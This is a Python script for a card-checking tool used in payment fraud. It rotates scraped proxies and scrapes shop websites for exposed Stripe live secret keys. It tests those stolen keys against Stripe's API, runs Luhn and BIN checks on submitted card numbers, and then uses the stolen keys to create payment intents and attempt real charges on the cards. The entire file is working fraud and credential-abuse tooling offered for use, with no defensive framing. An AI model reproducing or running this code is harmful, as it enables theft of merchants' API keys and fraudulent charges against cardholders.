import requests
import random
import re
import aiohttp
import asyncio
import bs4
from bs4 import BeautifulSoup
from config import PROXY_SOURCES, SHOP_LIST

proxies_list = []
keys_list = []
lock = asyncio.Lock()

def luhn_validate(num_str):
    digits = [int(d) for d in num_str]
    digits.reverse()
    total = 0
    for i, digit in enumerate(digits):
        if i % 2 == 1:
            doubled = digit * 2
            total += doubled // 10 + doubled % 10
        else:
            total += digit
    return total % 10 == 0

async def refresh_sources():
    global proxies_list
    all_px = []
    for src in PROXY_SOURCES:
        try:
            r = requests.get(src, timeout=10)
            all_px.extend([p.strip() for p in r.text.split('\n') if ':' in p])
        except: pass
    all_px = list(set(all_px))[:1000]
    live_px = []
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as sess:
        coros = [test_px(sess, px) for px in all_px[:200]]
        res = await asyncio.gather(*coros, return_exceptions=True)
        live_px = [r for r in res if isinstance(r, str)]
    proxies_list = live_px[:50]
    print(f"Sources updated: {len(proxies_list)} active")

async def test_px(sess, px):
    try:
        proxy_url = f"http://{px}"
        async with sess.get("http://httpbin.org/ip", proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return px if resp.status == 200 else None
    except: return None

async def refresh_keys():
    global keys_list
    new_keys = []
    connector = aiohttp.TCPConnector(limit=50)
    async with aiohttp.ClientSession(connector=connector) as sess:
        shops_sample = random.sample(SHOP_LIST, min(5, len(SHOP_LIST)))
        for shop in shops_sample:
            try:
                async with sess.get(shop, timeout=10) as resp:
                    if resp.status == 200:
                        txt = await resp.text()
                        matches = re.findall(r'sk_live_[0-9a-zA-Z]+', txt)
                        new_keys.extend(matches)
                        soup = BeautifulSoup(txt, 'html.parser')
                        for script in soup.find_all('script'):
                            if script.string:
                                matches = re.findall(r'sk_live_[0-9a-zA-Z]+', script.string)
                                new_keys.extend(matches)
            except: pass
    new_keys = list(set(new_keys))[:10]
    live_new = []
    for key in new_keys:
        if await test_key(key):
            live_new.append(key)
    if live_new:
        keys_list.extend(live_new)
        keys_list = keys_list[-20:]
        print(f"Keys updated: {len(live_new)} new, total {len(keys_list)}")

async def test_key(key):
    try:
        headers = {'Authorization': f'Bearer {key}'}
        resp = requests.post('https://api.stripe.com/v1/payment_intents', headers=headers, data={'amount':'1'}, timeout=10)
        return resp.status_code < 403
    except: return False

async def get_sources():
    if not proxies_list:
        await refresh_sources()
    return proxies_list or ['']

async def get_keys():
    if not keys_list:
        await refresh_keys()
    return keys_list or ['dummy_key']

async def bin_info(bin_num):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(f'https://binlist.net/json/{bin_num}') as resp:
                if resp.status == 200:
                    data = await resp.json()
                    scheme = data.get('scheme', '').lower()
                    return 'visa' in scheme or 'mastercard' in scheme, data.get('bank', {}).get('name', 'Unknown')
    except: pass
    return False, 'Unknown'

async def process_data(data_str):
    parts = re.split(r'[\|/ ]', data_str.strip())
    if len(parts) < 4: return "Invalid format"
    num, mon, yr, cv = parts[:4]
    
    if not luhn_validate(num) or not (1 <= int(mon) <= 12) or int(yr) < 26:
        return "Validation failed"
    
    bin6 = num[:6]
    valid_bin, issuer = await bin_info(bin6)
    if not valid_bin: return f"Invalid BIN {bin6} ({issuer})"
    
    px = random.choice(await get_sources()) if proxies_list else None
    px_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
    
    curr_keys = await get_keys()
    for key in curr_keys:
        try:
            payload = {
                'amount': '100', 'currency': 'usd',
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': num,
                'payment_method_data[card][exp_month]': mon,
                'payment_method_data[card][exp_year]': f'20{yr}',  # FIXED SYNTAX
                'payment_method_data[card][cvc]': cv,
            }
            headers = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=payload, proxies=px_dict, headers=headers, timeout=15)
            if resp.status_code == 200 and 'requires_action' not in resp.text.lower():
                # Charge attempt
                charge_payload = payload.copy()
                charge_payload['amount'] = '500'
                charge_resp = requests.post('https://api.stripe.com/v1/payment_intents', data=charge_payload, proxies=px_dict, headers=headers, timeout=15)
                charge_ok = " | Charge success" if charge_resp.status_code == 200 else " | Auth only"
                if not await test_key(key):
                    keys_list.remove(key)
                return f"Valid [{issuer}] | BIN:{bin6}{charge_ok}"
        except:
            if key in keys_list: keys_list.remove(key)
            continue
    return "All attempts failed (refreshing)"

